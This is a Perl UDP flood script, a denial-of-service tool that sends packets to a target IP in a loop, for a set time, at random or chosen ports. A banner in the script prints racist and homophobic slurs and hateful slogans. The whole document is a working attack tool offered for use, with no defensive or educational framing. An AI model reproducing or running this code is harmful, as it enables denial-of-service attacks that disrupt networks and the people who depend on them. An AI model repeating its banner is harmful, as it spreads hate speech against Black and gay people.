#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##
# ViralUNperified <---
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD BLUE<<EOTEXT;
╔══════════════════════════════════════════════════════════════════════════╗
║  I Don`t Associate With Nigga,Ddos That Nigga                            ║
║  Fuck The Black World!,You're Fucking Life!,You're Faggot!               ║
║                                                                          ║
║  ████         ██  ████████    █████         █████           █████        ║
║  ██ ██        ██     ██     ██     ██     ██     ██        ██   ██       ║
║  ██  ██       ██     ██    ██       ██   ██       ██      ██     ██      ║
║  ██   ██      ██     ██    ██       ██   ██       ██     ██       ██     ║
║  ██    ██     ██     ██    ██            ██             ██         ██    ║
║  ██     ██    ██     ██    ██  █████     ██  █████     ██           ██   ║
║  ██      ██   ██     ██    ██       ██   ██       ██   ██           ██   ║
║  ██       ██  ██     ██    ██       ██   ██       ██   ███████████████   ║
║  ██        ██ ██     ██     ██     ██     ██     ██    ██           ██   ║
║  ██         ████  ████████    █████         █████      ██           ██   ║
║                                                                          ║   
╚══════════════════════════════════════════════════════════════════════════╝
Fucking router.
Nigga perl script.
By:Scarcly Aka ViralUnperified

EOTEXT

print "Fuck Nigga : $ip " . ($port ? $port : "random") . "
Getting Fucked with " .
  ($size ? "$size byte's" : "Error..") . "
  ~Get Ran Nigga! 
  ~I Don't Associate With Nigga's!~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}  

